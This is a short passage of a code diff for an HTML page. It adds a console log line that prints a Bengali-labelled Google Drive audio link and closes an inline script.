+            console.log('📌 অডিও লিংক: https://drive.google.com/uc?export=open&id=1WF4FecEnkbTMxgl2bdFXUKR0axwPdEGp');
+
+        })();
+    </script>
+
 </body>
 </html>
